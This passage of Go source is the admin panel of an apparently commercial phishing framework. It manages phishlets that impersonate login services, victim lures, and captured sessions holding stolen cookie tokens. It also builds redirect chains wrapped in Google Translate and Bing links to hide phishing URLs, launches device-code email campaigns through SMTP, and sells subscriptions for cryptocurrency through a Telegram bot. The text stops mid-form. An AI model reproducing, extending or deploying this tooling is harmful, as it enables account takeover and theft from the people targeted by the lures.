package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// ───────────────────────────── CSS / shell ─────────────────────────────────

const panelCSS = `
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',monospace;font-size:14px}
h1{color:#e05252;font-size:1.4rem;margin-bottom:4px}
h2{color:#e0a040;font-size:1.1rem;margin:24px 0 8px;border-bottom:1px solid #222;padding-bottom:6px}
a{color:#52b0e0;text-decoration:none}a:hover{text-decoration:underline}
.wrap{max-width:1300px;margin:0 auto;padding:24px 16px}
.topbar{background:#111;border-bottom:1px solid #2a2a2a;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
.topbar .brand{color:#e05252;font-size:1.1rem;font-weight:bold;letter-spacing:2px}
.topbar .sub{color:#555;font-size:.82rem}
.topbar nav{margin-left:auto;display:flex;gap:12px}
.topbar nav a{color:#888;font-size:.82rem}
.topbar nav a:hover{color:#e0e0e0}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.75rem;font-weight:600}
.badge-green{background:#0d2a0d;color:#4cd44c}
.badge-red{background:#2a0d0d;color:#e05252}
.badge-blue{background:#0d1a2a;color:#52b0e0}
.badge-yellow{background:#2a1e00;color:#e0a040}
.badge-gray{background:#1e1e1e;color:#777}
.stats{display:flex;gap:12px;margin:16px 0;flex-wrap:wrap}
.stat-box{background:#141414;border:1px solid #252525;border-radius:6px;padding:14px 22px;min-width:130px}
.stat-box .n{font-size:2rem;font-weight:700;color:#e05252}
.stat-box .n.green{color:#4cd44c}
.stat-box .n.blue{color:#52b0e0}
.stat-box .l{font-size:.75rem;color:#555;margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
table{width:100%;border-collapse:collapse;margin-top:6px;font-size:.84rem}
th{background:#161616;color:#666;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px;padding:8px 10px;text-align:left;border-bottom:1px solid #252525}
td{padding:7px 10px;border-bottom:1px solid #181818;vertical-align:middle}
tr:hover td{background:#121212}
.mono{font-family:monospace;font-size:.82rem;color:#aaa}
.url-cell{font-family:monospace;font-size:.78rem;color:#52b0e0;word-break:break-all;max-width:260px}
form.inline{display:inline}
input[type=text],input[type=password],select{background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:.84rem}
input[type=text]:focus,input[type=password]:focus,select:focus{outline:none;border-color:#484848}
button,.btn{background:#1e1212;border:1px solid #4a2020;color:#e05252;padding:5px 14px;border-radius:4px;cursor:pointer;font-size:.8rem;text-decoration:none;display:inline-block}
button:hover,.btn:hover{background:#2a1818;border-color:#7a3333}
.btn-blue{background:#101820;border-color:#1e4466;color:#52b0e0}
.btn-blue:hover{background:#152030;border-color:#2a5588}
.btn-green{background:#0d1e0d;border-color:#1e4a1e;color:#4cd44c}
.btn-green:hover{background:#102510;border-color:#2a6a2a}
.btn-gray{background:#181818;border-color:#2e2e2e;color:#777}
.section{margin-top:32px}
.form-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
.card{background:#111;border:1px solid #222;border-radius:6px;padding:16px;margin:10px 0}
.err{color:#e05252;background:#1a0808;border:1px solid #3a1212;border-radius:4px;padding:8px 12px;margin:10px 0;font-size:.84rem}
.ok{color:#4cd44c;background:#081a08;border:1px solid #123a12;border-radius:4px;padding:8px 12px;margin:10px 0;font-size:.84rem}
.empty{color:#383838;font-style:italic;padding:14px 0;font-size:.84rem}
.chain-box{background:#0a0e0a;border:1px solid #1a2e1a;border-radius:5px;padding:12px 14px;margin-top:8px;font-size:.78rem}
.chain-box .label{color:#4cd44c;font-weight:600;margin-bottom:4px;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px}
.chain-box .link{font-family:monospace;color:#52e08a;word-break:break-all;margin-bottom:8px}
.chain-box .link a{color:#52e08a}
.chain-box .hop{font-family:monospace;color:#555;font-size:.72rem;margin-top:2px;word-break:break-all}
details>summary{cursor:pointer;color:#52b0e0;font-size:.8rem;padding:4px 0;list-style:none}
details>summary::-webkit-details-marker{display:none}
details[open]>summary{color:#e0a040}
pre{background:#0a0a0a;border:1px solid #1e1e1e;padding:10px;border-radius:4px;overflow-x:auto;font-size:.75rem;color:#aaa;white-space:pre-wrap;word-break:break-all}
.tabs{display:flex;gap:0;border-bottom:1px solid #252525;margin-bottom:16px}
.tab{padding:8px 18px;cursor:pointer;font-size:.82rem;color:#666;border-bottom:2px solid transparent}
.tab.active{color:#e0a040;border-bottom-color:#e0a040}
`

func panelPage(title, navExtra, body string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>%s — x-tymus</title>
<style>%s</style>
</head>
<body>
<div class="topbar">
  <span class="brand">◈ x-tymus</span>
  <span class="sub">%s</span>
  <nav>%s</nav>
</div>
<div class="wrap">%s</div>
<script>
// copy-to-clipboard helper
function cp(el){
  var t=el.getAttribute('data-copy');
  navigator.clipboard&&navigator.clipboard.writeText(t).then(function(){
    var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1200);
  });
}
</script>
</body></html>`, title, panelCSS, title, navExtra, body)
}

// ───────────────────────────── Auth ────────────────────────────────────────

func (s *HttpServer) requireAdminAuth(w http.ResponseWriter, r *http.Request) bool {
	pass := s.Cfg.GetAdminPassword()
	if pass == "" {
		http.Error(w, "Admin password not set. Run: config admin_password <pass>", http.StatusForbidden)
		return false
	}
	user, pw, ok := r.BasicAuth()
	if !ok || user != "admin" || pw != pass {
		w.Header().Set("WWW-Authenticate", `Basic realm="x-tymus Admin"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

// ───────────────────────────── Admin Panel ─────────────────────────────────

func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdminAuth(w, r) {
		return
	}

	// ── POST actions ──
	if r.Method == http.MethodPost {
		r.ParseForm()
		switch r.FormValue("action") {

		case "create_user":
			uname := strings.TrimSpace(r.FormValue("username"))
			pass := strings.TrimSpace(r.FormValue("password"))
			if uname == "" || pass == "" {
				http.Redirect(w, r, "/admin/panel?err=username+and+password+required", http.StatusSeeOther)
				return
			}
			token := GenRandomToken()
			if _, err := s.Db.CreateUser(uname, pass, token); err != nil {
				log.Error("admin: create user: %v", err)
				http.Redirect(w, r, "/admin/panel?err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
				return
			}
			log.Info("admin: created user '%s'", uname)
			http.Redirect(w, r, "/admin/panel?ok=user+created", http.StatusSeeOther)
			return

		case "delete_user":
			id, _ := strconv.Atoi(r.FormValue("id"))
			s.Db.DeleteUserById(id)
			http.Redirect(w, r, "/admin/panel", http.StatusSeeOther)
			return

		case "assign_lure":
			lureIdx, _ := strconv.Atoi(r.FormValue("lure_id"))
			username := strings.TrimSpace(r.FormValue("username"))
			l, err := s.Cfg.GetLure(lureIdx)
			if err == nil {
				if username == "" || username == "-" {
					l.UserId = ""
				} else {
					l.UserId = username
				}
				s.Cfg.SetLure(lureIdx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "blacklist_add":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.AddIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "blacklist_remove":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.RemoveIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "delete_session":
			sid, _ := strconv.Atoi(r.FormValue("session_id"))
			s.Db.DeleteSessionById(sid)
			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
			return

		// ── Lure management ──
		case "create_lure":
			pl := strings.TrimSpace(r.FormValue("phishlet"))
			path := strings.TrimSpace(r.FormValue("path"))
			redir := strings.TrimSpace(r.FormValue("redirect_url"))
			user := strings.TrimSpace(r.FormValue("user_id"))
			if pl == "" {
				http.Redirect(w, r, "/admin/panel?tab=lures&err=phishlet+required", http.StatusSeeOther)
				return
			}
			if path == "" {
				path = "/" + GenRandomString(8)
			}
			lure := &Lure{Path: path, Phishlet: pl, RedirectUrl: redir, UserId: user}
			s.Cfg.AddLure(pl, lure)
			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+created", http.StatusSeeOther)
			return

		case "delete_lure":
			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
			s.Cfg.DeleteLure(idx)
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "edit_lure":
			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
			l, err := s.Cfg.GetLure(idx)
			if err == nil {
				if v := strings.TrimSpace(r.FormValue("redirect_url")); v != "" {
					l.RedirectUrl = v
				}
				if v := strings.TrimSpace(r.FormValue("path")); v != "" {
					l.Path = v
				}
				s.Cfg.SetLure(idx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+updated", http.StatusSeeOther)
			return

		// ── Phishlet management ──
		case "enable_phishlet":
			site := strings.TrimSpace(r.FormValue("site"))
			if err := s.Cfg.SetSiteEnabled(site); err != nil {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" enabled"), http.StatusSeeOther)
			}
			return

		case "disable_phishlet":
			site := strings.TrimSpace(r.FormValue("site"))
			if err := s.Cfg.SetSiteDisabled(site); err != nil {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" disabled"), http.StatusSeeOther)
			}
			return

		case "set_phishlet_hostname":
			site := strings.TrimSpace(r.FormValue("site"))
			hostname := strings.TrimSpace(r.FormValue("hostname"))
			if ok := s.Cfg.SetSiteHostname(site, hostname); !ok {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=failed+to+set+hostname", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=hostname+saved", http.StatusSeeOther)
			}
			return

		case "set_phishlet_unauth":
			site := strings.TrimSpace(r.FormValue("site"))
			unauthUrl := strings.TrimSpace(r.FormValue("unauth_url"))
			if ok := s.Cfg.SetSiteUnauthUrl(site, unauthUrl); !ok {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=invalid+unauth+url", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=unauth+url+saved", http.StatusSeeOther)
			}
			return

		// ── Telegram Bot config ──
		case "save_bot_config":
			token := strings.TrimSpace(r.FormValue("bot_token"))
			adminIdStr := strings.TrimSpace(r.FormValue("bot_admin_chat_id"))
			adminId, _ := strconv.ParseInt(adminIdStr, 10, 64)
			btc := strings.TrimSpace(r.FormValue("crypto_btc"))
			eth := strings.TrimSpace(r.FormValue("crypto_eth"))
			usdt := strings.TrimSpace(r.FormValue("crypto_usdt"))
			priceStr := strings.TrimSpace(r.FormValue("sub_price"))
			price, _ := strconv.Atoi(priceStr)
			if token != "" {
				s.Cfg.SetBotToken(token)
			}
			if adminId != 0 {
				s.Cfg.SetBotAdminChatId(adminId)
			}
			if btc != "" {
				s.Cfg.SetCryptoBTC(btc)
			}
			if eth != "" {
				s.Cfg.SetCryptoETH(eth)
			}
			if usdt != "" {
				s.Cfg.SetCryptoUSDT(usdt)
			}
			if price > 0 {
				s.Cfg.SetSubPrice(price)
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=bot+config+saved+(restart+to+apply+token+change)", http.StatusSeeOther)
			return

		case "approve_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			if GlobalBot != nil {
				if err := GlobalBot.ApproveSub(id, s.Cfg.GetBotAdminChatId()); err != nil {
					http.Redirect(w, r, "/admin/panel?tab=telegram&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
					return
				}
			} else {
				http.Redirect(w, r, "/admin/panel?tab=telegram&err=bot+not+running", http.StatusSeeOther)
				return
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=approved", http.StatusSeeOther)
			return

		case "reject_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			if GlobalBot != nil {
				GlobalBot.RejectSub(id, s.Cfg.GetBotAdminChatId())
			} else {
				s.Db.DeleteSubscription(id)
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
			return

		case "delete_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			s.Db.DeleteSubscription(id)
			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
			return
		}
	}

	// ── Gather data ──
	userList, _ := s.Db.ListUsers()
	allSessions, _ := s.Db.ListSessions()
	allLures := s.Cfg.GetAllLures()
	allSubs, _ := s.Db.ListSubscriptions()

	totalTokens := 0
	for _, sess := range allSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	pendingSubs := 0
	for _, sub := range allSubs {
		if sub.Status == "pending" {
			pendingSubs++
		}
	}

	sessPerUser := map[string]int{}
	tokenPerUser := map[string]int{}
	for _, sess := range allSessions {
		for _, l := range allLures {
			if l.Phishlet == sess.Phishlet && l.UserId != "" {
				sessPerUser[l.UserId]++
				if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
					tokenPerUser[l.UserId]++
				}
				break
			}
		}
	}

	blCount := 0
	if GlobalBlacklist != nil {
		n, m := GlobalBlacklist.GetStats()
		blCount = n + m
	}

	activeTab := r.URL.Query().Get("tab")
	if activeTab == "" {
		activeTab = "overview"
	}
	errMsg := r.URL.Query().Get("err")
	okMsg := r.URL.Query().Get("ok")

	var b strings.Builder

	// ── Header & stats ──
	b.WriteString(`<h1>Admin Panel</h1>`)
	b.WriteString(fmt.Sprintf(`<div class="stats">
  <div class="stat-box"><div class="n">%d</div><div class="l">Users</div></div>
  <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
  <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
  <div class="stat-box"><div class="n" style="color:#e0a040">%d</div><div class="l">Subscriptions</div></div>
  <div class="stat-box"><div class="n" style="color:#e05252">%d</div><div class="l">Pending Subs</div></div>
  <div class="stat-box"><div class="n" style="color:#555">%d</div><div class="l">Blacklisted</div></div>
</div>`, len(userList), len(allLures), len(allSessions), totalTokens, len(allSubs), pendingSubs, blCount))

	if errMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="err">%s</div>`, template.HTMLEscapeString(errMsg)))
	}
	if okMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="ok">%s</div>`, template.HTMLEscapeString(okMsg)))
	}

	// ── Tab nav ──
	pendingLabel := "Telegram Bot"
	if pendingSubs > 0 {
		pendingLabel = fmt.Sprintf("Telegram Bot (%d pending)", pendingSubs)
	}
	tabs := []struct{ id, label string }{
		{"overview", "Overview"},
		{"users", "Users"},
		{"phishlets", "Phishlets"},
		{"lures", "Lures & Chains"},
		{"sessions", "Sessions"},
		{"devicecodes", "Device Codes"},
		{"blacklist", "Blacklist"},
		{"telegram", pendingLabel},
	}
	b.WriteString(`<div class="tabs">`)
	for _, t := range tabs {
		cls := "tab"
		if t.id == activeTab {
			cls += " active"
		}
		b.WriteString(fmt.Sprintf(`<a href="/admin/panel?tab=%s" class="%s">%s</a>`, t.id, cls, t.label))
	}
	b.WriteString(`</div>`)

	switch activeTab {

	// ── OVERVIEW ──────────────────────────────────────────────────────────
	case "overview":
		b.WriteString(`<div class="section"><h2>Recent Sessions</h2>`)
		recent := allSessions
		if len(recent) > 10 {
			recent = recent[len(recent)-10:]
		}
		if len(recent) == 0 {
			b.WriteString(`<div class="empty">No sessions yet.</div>`)
		} else {
			b.WriteString(sessionTable(recent, false))
		}
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>Users at a Glance</h2>`)
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── USERS ─────────────────────────────────────────────────────────────
	case "users":
		b.WriteString(`<div class="section"><h2>Create User</h2>`)
		b.WriteString(`<form method="POST" action="/admin/panel">
<input type="hidden" name="action" value="create_user">
<div class="form-row">
  <input type="text" name="username" placeholder="username" required style="width:160px">
  <input type="password" name="password" placeholder="password" required style="width:160px">
  <button type="submit" class="btn-blue">+ Create User</button>
</div></form>`)
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>All Users</h2>`)
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── PHISHLETS ─────────────────────────────────────────────────────────
	case "phishlets":
		b.WriteString(`<div class="section"><h2>Phishlet Configuration</h2>`)
		names := s.Cfg.GetPhishletNames()
		if len(names) == 0 {
			b.WriteString(`<div class="empty">No phishlets loaded. Add .yaml files to your phishlets directory.</div>`)
		} else {
			b.WriteString(`<table><thead><tr>
<th>Name</th><th>Service</th><th>Hostname</th><th>Unauth URL</th><th>Status</th><th>Actions</th>
</tr></thead><tbody>`)
			for _, name := range names {
				pc := s.Cfg.PhishletConfig(name)
				enabled := pc.Enabled
				statusBadge := `<span class="badge badge-gray">disabled</span>`
				if enabled {
					statusBadge = `<span class="badge badge-green">enabled</span>`
				}
				hostname := pc.Hostname
				if hostname == "" {
					hostname = `<span style="color:#555">not set</span>`
				}
				unauthUrl := pc.UnauthUrl
				if unauthUrl == "" {
					unauthUrl = `<span style="color:#555">—</span>`
				}

				toggleBtn := ""
				if enabled {
					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
<input type="hidden" name="action" value="disable_phishlet">
<input type="hidden" name="site" value="%s">
<button type="submit" class="btn-gray" style="font-size:.74rem;padding:2px 8px">disable</button>
</form>`, template.HTMLEscapeString(name))
				} else {
					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
<input type="hidden" name="action" value="enable_phishlet">
<input type="hidden" name="site" value="%s">
<button type="submit" class="btn-green" style="font-size:.74rem;padding:2px 8px">enable</button>
</form>`, template.HTMLEscapeString(name))
				}

				hostnameForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:4px;margin-top:4px">
<input type="hidden" name="action" value="set_phishlet_hostname">
<input type="hidden" name="site" value="%s">
<input type="text" name="hostname" placeholder="sub.yourdomain.com" style="font-size:.76rem;padding:3px 6px;width:200px" value="%s">
<button type="submit" style="font-size:.74rem;padding:3px 8px">set</button>
</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.Hostname))

				unauthForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:4px;margin-top:4px">
<input type="hidden" name="action" value="set_phishlet_unauth">
<input type="hidden" name="site" value="%s">
<input type="text" name="unauth_url" placeholder="https://..." style="font-size:.76rem;padding:3px 6px;width:200px" value="%s">
<button type="submit" style="font-size:.74rem;padding:3px 8px">set</button>
</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.UnauthUrl))

				b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-red">%s</span></td>
<td style="color:#aaa;font-size:.82rem">%s</td>
<td>%s%s</td>
<td>%s%s</td>
<td>%s</td>
<td>%s</td>
</tr>`,
					template.HTMLEscapeString(name),
					phishletFriendlyName(name),
					hostname, hostnameForm,
					unauthUrl, unauthForm,
					statusBadge,
					toggleBtn,
				))
			}
			b.WriteString(`</tbody></table>`)
		}
		b.WriteString(`</div>`)

		// Quick create lure from this tab too
		b.WriteString(`<div class="section"><h2>Quick Create Lure</h2>`)
		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
		b.WriteString(`</div>`)

	// ── LURES & CHAINS ────────────────────────────────────────────────────
	case "lures":
		b.WriteString(`<div class="section"><h2>Create Lure</h2>`)
		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>All Lures</h2>`)
		if len(allLures) == 0 {
			b.WriteString(`<div class="empty">No lures configured yet. Create one above.</div>`)
		} else {
			b.WriteString(`<table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
</tr></thead><tbody>`)
			for i, l := range allLures {
				// Build the phishing URL for this lure
				lureURL := ""
				if l.Hostname != "" {
					lureURL = "https://" + l.Hostname + l.Path
				} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
					if pu, err := pl.GetLureUrl(l.Path); err == nil {
						lureURL = pu
					}
				}
				// lureURL is the clean base URL — no login_hint placeholder here.
				// To personalize for a specific victim add ?login_hint=email manually.

				lureURLCell := `<span style="color:#383838">—</span>`
				if lureURL != "" {
					lureURLCell = fmt.Sprintf(`<span class="url-cell">%s</span>
<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-top:3px" onclick="cp(this)" data-copy="%s">copy</button>`,
						template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
				}

				redirectCell := `<span style="color:#383838">—</span>`
				if l.RedirectUrl != "" {
					redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.76rem">%s</a>`,
						template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 36)))
				}

				userCell := `<span style="color:#383838">unassigned</span>`
				if l.UserId != "" {
					userCell = fmt.Sprintf(`<span class="badge badge-blue">%s</span>`, template.HTMLEscapeString(l.UserId))
				}

				// Generate redirect chain links
				chainCell := `<span style="color:#383838">—</span>`
				if lureURL != "" {
					parsedURL, err := url.Parse(lureURL)
					if err == nil {
						phishBase := parsedURL.Scheme + "://" + parsedURL.Host
						outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
						if err == nil {
							translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
							bingLink := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)

							chainID := fmt.Sprintf("chain-%d", i)
							chainCell = fmt.Sprintf(`<details id="%s">
<summary>▶ generate chain</summary>
<div class="chain-box">
  <div class="label">Google Translate (recommended — silent)</div>
  <div class="link"><a href="%s" target="_blank">%s</a>
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Bing Translator (silent)</div>
  <div class="link"><a href="%s" target="_blank">%s</a>
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Direct chain (no wrapper)</div>
  <div class="link"><a href="%s" target="_blank">%s</a>
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label" style="margin-top:8px">Hops</div>`,
								chainID,
								template.HTMLEscapeString(translateLink), template.HTMLEscapeString(truncateStr(translateLink, 60)), template.HTMLEscapeString(translateLink),
								template.HTMLEscapeString(bingLink), template.HTMLEscapeString(truncateStr(bingLink, 60)), template.HTMLEscapeString(bingLink),
								template.HTMLEscapeString(outer), template.HTMLEscapeString(truncateStr(outer, 60)), template.HTMLEscapeString(outer),
							)
							for j, hop := range hops {
								chainCell += fmt.Sprintf(`<div class="hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
							}
							chainCell += fmt.Sprintf(`<div class="hop" style="color:#2a6a2a">final → %s</div>`, template.HTMLEscapeString(lureURL))
							chainCell += `</div></details>`
						}
					}
				}

				// Assign user form
				userOptions := `<option value="-">— unassign —</option>`
				for _, u := range userList {
					sel := ""
					if u.Username == l.UserId {
						sel = " selected"
					}
					userOptions += fmt.Sprintf(`<option value="%s"%s>%s</option>`,
						template.HTMLEscapeString(u.Username), sel, template.HTMLEscapeString(u.Username))
				}
				assignForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures" style="display:flex;gap:4px;align-items:center">
<input type="hidden" name="action" value="assign_lure">
<input type="hidden" name="lure_id" value="%d">
<select name="username" style="font-size:.76rem;padding:3px 6px">%s</select>
<button type="submit" style="font-size:.74rem;padding:3px 8px">save</button>
</form>`, i, userOptions)

				deleteLureBtn := fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=lures" onsubmit="return confirm('Delete lure %d?')">
<input type="hidden" name="action" value="delete_lure">
<input type="hidden" name="lure_id" value="%d">
<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
</form>`, i, i)

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span><br><span style="color:#555;font-size:.72rem">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s<br style="margin:4px">%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i,
					template.HTMLEscapeString(l.Phishlet),
					phishletFriendlyName(l.Phishlet),
					lureURLCell, redirectCell,
					userCell, assignForm,
					chainCell,
					deleteLureBtn,
				))
			}
			b.WriteString(`</tbody></table>`)
		}
		b.WriteString(`</div>`)

	// ── SESSIONS ──────────────────────────────────────────────────────────
	case "sessions":
		b.WriteString(`<div class="section"><h2>All Sessions</h2>`)
		if len(allSessions) == 0 {
			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
		} else {
			b.WriteString(sessionTable(allSessions, true))
		}
		b.WriteString(`</div>`)

	// ── BLACKLIST ─────────────────────────────────────────────────────────
	case "blacklist":
		b.WriteString(`<div class="section"><h2>Add to Blacklist</h2>`)
		b.WriteString(`<form method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_add">
<div class="form-row">
  <input type="text" name="ip" placeholder="IP or CIDR e.g. 1.2.3.4 or 1.2.3.0/24" style="width:280px">
  <button type="submit">Block IP / CIDR</button>
</div></form>`)
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>Blocked IPs</h2>`)
		if GlobalBlacklist == nil {
			b.WriteString(`<div class="empty">Blacklist not loaded.</div>`)
		} else {
			ips := make([]string, 0, len(GlobalBlacklist.ips))
			for k := range GlobalBlacklist.ips {
				ips = append(ips, k)
			}
			if len(ips) == 0 && len(GlobalBlacklist.masks) == 0 {
				b.WriteString(`<div class="empty">No IPs blocked yet.</div>`)
			} else {
				b.WriteString(`<table><thead><tr><th>IP / CIDR</th><th>Type</th><th></th></tr></thead><tbody>`)
				for _, ip := range ips {
					b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-gray">IP</span></td>
<td>
<form class="inline" method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_remove">
<input type="hidden" name="ip" value="%s">
<button type="submit" style="font-size:.74rem;padding:2px 8px">remove</button>
</form>
</td></tr>`, template.HTMLEscapeString(ip), template.HTMLEscapeString(ip)))
				}
				for _, m := range GlobalBlacklist.masks {
					if m.mask != nil {
						b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-yellow">CIDR</span></td>
<td><span style="color:#383838;font-size:.74rem">auto-blocked</span></td>
</tr>`, template.HTMLEscapeString(m.mask.String())))
					}
				}
				b.WriteString(`</tbody></table>`)
			}
		}
		b.WriteString(`</div>`)

	// ── DEVICE CODES ──────────────────────────────────────────────────────
	case "devicecodes":
		// Handle POST actions
		if r.Method == "POST" {
			action := r.FormValue("action")
			switch action {
			case "save_smtp":
				host := strings.TrimSpace(r.FormValue("smtp_host"))
				portStr := strings.TrimSpace(r.FormValue("smtp_port"))
				user := strings.TrimSpace(r.FormValue("smtp_user"))
				pass := r.FormValue("smtp_pass")
				from := strings.TrimSpace(r.FormValue("smtp_from"))
				port, _ := strconv.Atoi(portStr)
				s.Cfg.SetSmtp(host, port, user, pass, from)
				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=smtp+saved", http.StatusSeeOther)
				return
			case "launch_campaign":
				name := strings.TrimSpace(r.FormValue("camp_name"))
				tmpl := r.FormValue("camp_template")
				emailsRaw := r.FormValue("camp_emails")
				var emails []string
				for _, line := range strings.Split(emailsRaw, "\n") {
					e := strings.TrimSpace(line)
					if e != "" {
						emails = append(emails, e)
					}
				}
				if len(emails) == 0 {
					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=no+emails", http.StatusSeeOther)
					return
				}
				camp, _ := LaunchCampaign(name, tmpl, emails)
				http.Redirect(w, r, fmt.Sprintf("/admin/panel?tab=devicecodes&ok=campaign+%d+launched+(%d+targets)", camp.ID, len(camp.Targets)), http.StatusSeeOther)
				return
			}
		}

		baseURL := "http://" + s.Cfg.GetServerExternalIP()

		// ── SMTP config ──
		b.WriteString(`<div class="section"><h2>SMTP Configuration</h2>`)
		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
<input type="hidden" name="action" value="save_smtp">
<div class="form-row">
  <label style="color:#666;width:120px;font-size:.8rem">SMTP Host</label>
  <input type="text" name="smtp_host" placeholder="smtp.gmail.com" value="%s" style="width:240px">
